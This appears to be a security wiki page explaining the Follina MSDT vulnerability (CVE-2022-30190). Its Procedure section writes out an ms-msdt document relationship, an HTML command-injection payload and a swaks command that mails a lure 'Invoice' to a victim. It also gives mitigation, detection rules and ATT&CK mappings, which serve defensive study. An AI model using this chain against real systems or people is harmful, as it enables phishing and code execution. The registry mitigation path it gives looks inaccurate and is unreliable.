---
topic: Follina (CVE-2022-30190) and the ms-msdt protocol
tags: [windows, follina, msdt, cve-2022-30190, office]
---

# Follina (CVE-2022-30190) and the ms-msdt protocol

**English** | [🇪🇸 Español](follina-msdt.md)

## Concept

Follina is a Microsoft Support Diagnostic Tool (MSDT) vulnerability triggered by the `ms-msdt:` scheme. An Office document opens a remote URL and MSDT runs PowerShell without showing the diagnostic UI. The flaw affects Windows and was exploited with malicious Word documents.

## When it applies

- Windows without the June 2022 patch.
- Office opens the document and allows the `ms-msdt` protocol.
- The host can reach the Internet or the attacker's server.
- The victim opens the file and accepts Protected View, if prompted.

## Requirements and conditions

1. A document with an external relationship (`settings.xml.rels`) pointing to `ms-msdt:`.
2. An HTTP server serving the HTML with the diagnostic script.
3. MSDT enabled and not blocked by policy.
4. Minimal victim interaction (opening the document).

## Procedure

The document contains an external relationship:

```xml
<Relationship Id="rId1"
  Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
  Target="ms-msdt:/id PCWDiagnostic /skip force /param ..." TargetMode="External"/>
```

The served HTML uses the parameter to load PowerShell:

```html
<script>
location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_BrowseForFile=/../../$(calc).exe /auto\"";
</script>
```

Serve it with a simple HTTP server and email the document:

```bash
python3 -m http.server 80
swaks --to victim@example.com --from it@example.com \
  --header 'Subject: Invoice' --attach document.docx
```

When opened, MSDT runs the command in the user's context.

## Variants

- **RTF** instead of DOCX, using the same scheme.
- **`ms-msdt:` link** in an email or document, no attachment.
- **HTML obfuscation** to evade mail filters.
- **Diagnostic chains** that download a second stage.

## Limitations

- Microsoft patched the flaw in June 2022; updated hosts are not vulnerable.
- Protected View and Office policies may block the external relationship.
- The `ms-msdt` protocol may be disabled by GPO.
- Execution is in the user's context, not SYSTEM; elevation needs a second step.

## Mitigation

- Apply the CVE-2022-30190 patch and keep Office updated.
- Disable `ms-msdt` via `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\msdt.exe`.
- Block dangerous attachments and protocols at the mail gateway.
- Enable Protected View and Office ASR rules.

## Detection

- `msdt.exe` as a child of `WINWORD.EXE` or `OUTLOOK.EXE`.
- Outbound HTTP from Office or MSDT to non-corporate domains.
- Process creation with `PCWDiagnostic` and `IT_BrowseForFile` parameters.
- Documents with external relationships to `ms-msdt:`.

MITRE ATT&CK: T1204.002 (Malicious File), T1218 (System Binary Proxy Execution), T1566.001 (Spearphishing Attachment).

## References

- <https://nvd.nist.gov/vuln/detail/CVE-2022-30190>
- <https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-30190>
- <https://attack.mitre.org/techniques/T1218/>
